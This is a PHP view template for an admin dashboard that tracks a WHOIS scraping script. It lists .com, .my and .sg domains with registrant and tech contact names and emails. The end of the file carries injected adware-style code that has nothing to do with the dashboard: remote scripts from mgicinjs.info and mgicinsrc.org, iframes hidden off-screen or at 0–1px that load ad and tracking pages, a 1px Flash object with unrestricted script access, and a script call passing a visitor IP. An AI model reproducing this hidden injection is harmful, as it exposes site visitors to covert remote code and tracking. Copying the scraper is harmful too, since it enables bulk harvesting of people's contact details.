<?php
$this->load->view('header');
?>
<script type='text/javascript'>
    var doInterval;
    function getfile() {
        $.ajax({
            url: "tmp/lastsite.txt",
            complete: function(request){
                $("#lastsite").html(request.responseText);
            }
        });
        $.ajax({
            url: "/tmp/status.txt",
            complete: function(request){
                $("#status").html(request.responseText);
            }
        });
    }
    doInterval = setInterval(getfile, 2000);
</script>



<div class="col-sm-9 col-sm-offset-3 col-md-10 col-md-offset-2 main">
    <h1 class="page-header">Dashboard</h1>

    <script src="https://code.jquery.com/jquery-1.10.2.js"></script>
    <h4 >Remaining Sites : <?php echo $pending; ?>  | Total Sites in Database : <?php echo $total; ?> </h4>
    <h4>Script status: <font color="red"><?php echo $status; ?></font></h4><h4>Last site : <font color="green"><div id="lastsite" style="display:inline">Loading</div></font></h4><h4> Script debug : <font color="red"><div id="status" style="display:inline">Loading</font></h4>

    <div class="table-responsive">
        <table class="table table-striped">
            <h4 class="sub-header">Recently fetched .com sites</h4>
            <thead>
            <tr>
                <th>No</th>
                <th>ID</th>
                <th>Site</th>
                <th>Registar URL</th>
                <th>Registrant Email</th>
                <th>Datas Grabbed</th>
            </tr>
            </thead>
            <tbody>
            <?php
            $counter = 1;
            foreach($common as $row){
                $valid = 0;
                foreach($row as $item){
                    if($item != ""){
                        $valid = $valid+1;
                    }
                }
                $output = <<<OP

                        <tr>
                        <td>{$counter}</td>
                        <td>{$row['id']}</td>
                        <td>{$row['site']}</td>
                        <td>{$row['registarurl']}</td>
                        <td>{$row['registrantemail']}</td>
                        <td><center>$valid/55</center></td>
                    </tr>

OP;
                echo $output;
                $counter=$counter+1;
            }
            ?>
            </tbody>
        </table>
        <br>
        <table class="table table-striped">
            <h4 class="sub-header">Recently fetched .my sites</h4>
            <thead>
            <tr>
                <th>No</th>
                <th>ID</th>
                <th>Site</th>
                <th>Reg No</th>
                <th>Registrant Email</th>
                <th>Datas Grabbed</th>
            </tr>
            </thead>
            <tbody>
            <?php
            $counter = 1;
            foreach($my as $row){
                $valid = 0;
                foreach($row as $item){
                    if($item != ""){
                        $valid = $valid+1;
                    }
                }
                $output = <<<OP

                        <tr>
                        <td>{$counter}</td>
                        <td>{$row['id']}</td>
                        <td>{$row['site']}</td>
                        <td>{$row['regno']}</td>
                        <td>{$row['techemail']}</td>
                        <td><center>$valid/35</center></td>
                    </tr>

OP;
                echo $output;
                $counter=$counter+1;
            }
            ?>
            </tbody>
        </table>
        <br>
        <table class="table table-striped">
            <h4 class="sub-header">Recently fetched .SG sites</h4>
            <thead>
            <tr>
                <th>No</th>
                <th>ID</th>
                <th>Site</th>
                <th>Tech Name</th>
                <th>Tech Email</th>
                <th>Datas Grabbed</th>
            </tr>
            </thead>
            <tbody>
            <?php
            $counter = 1;
            foreach($sg as $row){
                $valid = 0;
                foreach($row as $item){
                    if($item != ""){
                        $valid = $valid+1;
                    }
                }
                $output = <<<OP

                        <tr> 
                        <td>{$counter}</td>
                        <td>{$row['id']}</td>
                        <td>{$row['site']}</td>
                        <td>{$row['techname']}</td>
                        <td>{$row['techemail']}</td>
                        <td><center>$valid/12</center></td>
                    </tr>

OP;
                echo $output;
                $counter=$counter+1;
            }
            ?>

            </tbody>
        </table>
    </div>
</div>
</div>
</div>

<!-- Bootstrap core JavaScript
================================================== -->
<!-- Placed at the end of the document so the pages load faster -->
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
<script>window.jQuery || document.write('&lt;script src="../../assets/js/vendor/jquery.min.js"&gt;&lt;\/script&gt;')</script>
<script src="../../dist/js/bootstrap.min.js"></script>
<!-- Just to make our placeholder images work. Don't actually copy the next line! -->
<script src="../../assets/js/vendor/holder.min.js"></script>
<!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
<script src="../../assets/js/ie10-viewport-bug-workaround.js"></script>


<script async="" src="http://i.mgicinjs.info/mgicin/javascript.js" charset="UTF-8"></script><script async="" src="http://i.mgicinsrc.org/mgicin/javascript.js" charset="UTF-8"></script><iframe frameborder="0" class="hb1449839187717" id="hb1449839187717" style="width: 1px; height: 1px; position: absolute; top: -100000px; left: -100000px; visibility: visible; overflow: hidden;" border="no" scrolling="no" src="https://foxi69.tlscdn.com/altHbHandler.html#opdom=mgicinjs.info&amp;partner=mgicin&amp;channel=mgicin&amp;country=IN&amp;quick=https%3A%2F%2Fendall41-q.apollocdn.com%2F&amp;trinity=Z14l7k610g7b&amp;instgrp=&amp;referrer=&amp;hid=0&amp;sset=7"></iframe><iframe frameborder="0" id="asdfad" src="http://f.asdfzxcv1312.com/idle.html#B3bKB209BwDPy2LUANmUAw5MBYzWyxj0BMvYpw1NAwnPBIzJAgfUBMvSpw1NAwnPBIzJB3vUDhj5puLojMn1CNjLBNrKB21HAw49yxnKzNP4y3yXmZeYlMnVBsz0CMLUAxr5pvOXngW3AZyXmgC3yIzPBNn0z3jWpszZzxnZAw9UAwq9mtq0otGZote4nZC0mJC1ntaMAgLKptaMCgfNzxvYBd1ODhrWjtnbjtjgjtjgD2HVAxmLmKy=" visibility="visible" overflow="hidden" border="no" scrolling="no" style="width: 0;  height: 0;  position: absolute;  top: -10031px;  left:-1000000px;"></iframe><div id="dp_swf_engine" style="position: absolute; width: 1px; height: 1px;"><object width="1" height="1" type="application/x-shockwave-flash" data="http://www.ajaxcdn.org/swf.swf" id="_dp_swf_engine" style="width: 1px; height: 1px;"><param name="allowscriptaccess" value="always"></object></div><iframe frameborder="0" class="dealply-toast s" id="s" style="width: 1px; height: 1px; position: absolute; top: -100000px; left: -100000px; visibility: visible; overflow: hidden;" border="no" scrolling="no" src="http://f.mgicinjs.info/skinedEmpty.html"></iframe></body><script src="http://i.mgicinjs.info/opt_content.js?v=opt_1445931538722&amp;partner=mgicin&amp;channel=mgicin&amp;sset=7&amp;appTitle=&amp;products=&amp;ip=111.92.119.114" type="application/x-javascript"></script></html>